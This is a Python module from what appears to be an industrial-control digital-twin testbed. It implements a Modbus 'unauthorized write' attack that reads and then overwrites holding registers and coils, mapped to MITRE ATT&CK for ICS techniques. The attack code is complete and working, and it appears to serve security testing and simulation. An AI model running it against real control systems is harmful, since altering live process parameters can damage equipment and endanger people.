"""
Unauthorized Write Attack — Writes arbitrary values to holding registers or coils.

MITRE ATT&CK for ICS:
  T0855 — Unauthorized Command Message
  T0836 — Modify Parameter
"""

from __future__ import annotations

import logging
from typing import ClassVar

from ot_twin.attacks.base import BaseAttack
from ot_twin.models import AttackResult, ModbusTransaction, RegisterType

logger = logging.getLogger(__name__)


class UnauthorizedWriteAttack(BaseAttack):
    name = "unauthorized_write"
    description = "Write arbitrary values to holding registers/coils without auth"
    mitre_techniques: ClassVar[list[str]] = ["T0855", "T0836"]

    def __init__(
        self,
        *args,
        target_registers: dict[int, int] | None = None,
        target_coils: dict[int, bool] | None = None,
        **kwargs,
    ) -> None:
        """
        Args:
            target_registers: {address: value} for holding register writes.
            target_coils: {address: value} for coil writes.
        """
        super().__init__(*args, **kwargs)
        # Coerce keys to int: CLI params arrive as JSON whose object keys are
        # always strings (e.g. -p 'target_registers={"0": 99}'), but Modbus
        # addresses must be integers.
        self.target_registers = {int(k): v for k, v in (target_registers or {}).items()}
        self.target_coils = {int(k): bool(v) for k, v in (target_coils or {}).items()}

    async def execute(self) -> AttackResult:
        values_before: dict[int, int] = {}
        values_after: dict[int, int] = {}
        affected: list[int] = []
        success_count = 0

        # Read current values first (recon)
        for addr in self.target_registers:
            result = await self.client.read_holding_registers(
                address=addr, count=1, device_id=self.unit_id,
            )
            if not result.isError():
                values_before[addr] = result.registers[0]
                self._log_transaction(ModbusTransaction(
                    function_code=3,
                    register_type=RegisterType.HOLDING,
                    address=addr, count=1,
                    values=[result.registers[0]],
                ))

        # Write malicious values to holding registers
        for addr, value in self.target_registers.items():
            result = await self.client.write_register(
                address=addr, value=value, device_id=self.unit_id,
            )
            if not result.isError():
                success_count += 1
                values_after[addr] = value
                affected.append(addr)
                logger.info("[%s] Wrote HR[%d] = %d (was %d)",
                            self.name, addr, value,
                            values_before.get(addr, -1))
            self._log_transaction(ModbusTransaction(
                function_code=6,
                register_type=RegisterType.HOLDING,
                address=addr, values=[value], is_write=True,
            ))

        # Write malicious values to coils
        for addr, value in self.target_coils.items():
            # Read current
            read_result = await self.client.read_coils(
                address=addr, count=1, device_id=self.unit_id,
            )
            if not read_result.isError():
                values_before[1000 + addr] = int(read_result.bits[0])

            write_result = await self.client.write_coil(
                address=addr, value=value, device_id=self.unit_id,
            )
            if not write_result.isError():
                success_count += 1
                values_after[1000 + addr] = int(value)
                affected.append(1000 + addr)
                logger.info("[%s] Wrote Coil[%d] = %s", self.name, addr, value)
            self._log_transaction(ModbusTransaction(
                function_code=5,
                register_type=RegisterType.COIL,
                address=addr, values=[int(value)], is_write=True,
            ))

        total_targets = len(self.target_registers) + len(self.target_coils)
        details = f"Wrote {success_count}/{total_targets} targets successfully"

        return AttackResult(
            attack_name=self.name,
            success=success_count > 0,
            details=details,
            registers_affected=affected,
            values_before=values_before,
            values_after=values_after,
        )
